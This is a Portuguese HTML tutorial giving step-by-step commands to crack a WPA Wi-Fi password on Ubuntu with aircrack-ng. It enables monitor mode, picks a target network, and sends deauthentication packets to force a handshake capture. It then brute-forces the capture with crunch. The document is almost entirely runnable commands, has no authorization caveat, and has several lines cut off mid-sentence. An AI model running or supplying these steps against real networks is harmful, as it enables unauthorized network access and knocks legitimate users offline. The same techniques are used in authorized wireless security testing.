<p>
Instale o aircrack-ng:
</p>

<p>
<precode><code>sudo apt-get update
sudo apt-get install aircrack-ng
</code></pre>
</p>

<p>
Verificar o nome da sua interface Wi-FI:
</p>

<p>
<precode><code>iwconfig
</code></pre>
</p>

<p>
Após verificar o nome da interface, deve-se verificar se o Ubuntu está reconhecendo o driver da interface sem fio:
</p>

<p>
<precode><code>sudo airmon-ng
</code></pre>
</p>

<p>
verificar se tem algum processo que pode acabar atrapalhando o processo de captura de pacotes:
</p>

<p>
<precode><code>sudo airmon-ng check kill
</code></pre>
</p>

<p>
Vamos colocar nossa placa de rede em modo monitor:
</p>

<p>
<precode><code>sudo airmon-ng start [nome_da_sua_interface_wireless]
iwconfig
</code></pre>

<p>
Quando a placa estiver pronta para monitorar, podemos ver quais são as redes disponíveis para nossos possíveis ataques.
</p>

<p>
<precode><code>airodump-ng [nome_da_sua_interface_wireless]
</code></pre>

<p>
Após selecionar a rede alvo, utilizaremos algumas de suas informações. Você pode guardá-las em um bloco de$
<strong>BSSID:</strong> <em>Basic Service Set Identifier</em> se refere ao endereço MAC de um adaptador se$
<strong>CH:</strong> Canal na qual a rede está operando.<br />
<strong>ESSID:</strong> nome que é visível na rede.<br />
</p>

<p>
Agora que temos a rede alvo, iremos monitorá-la usando algumas das informações adquiridas que guardamos em$
<p>
<pre><code>sudo airodump-ng -c [canal_da_rede_alvo] --bssid [bssid_da_rede_alvo] -w dados
</code></pre>
</p>

<p>
Hora de capturar o tão esperado WPA HANDSHAKE. Para que seja capturado, é preciso que alguém se conecte à $
<p>
<pre><code>sudo aireplay-ng -0 10 -a [bssid_da_rede_alvo] [nome_da_sua_interface_wireless]
</code></pre>
</p>

<p>
Verificar o WPA HANDSHAKE capturado no arquivo criado anteriormente na execução do comando de captura. No $
</p>
<pre><code>ls
sudo aircrack-ng net-01.cap
</code></pre>
</p>

<p>
Hora de quebrar no Brute Force:
<p>
<pre><code>sudo crunch [min] [max] [padrão] | aircrack-ng [net-01.cap] -w - -e [essid_da_rede_alvo]
</code></pre>
</p>

<p>
Ao final, temos de reativar o nosso network-manager pois ao usar o comando check kill ele o desativa.
</p>

<p>
<precode><code>sudo service network-manager start
</code></pre>
</p>
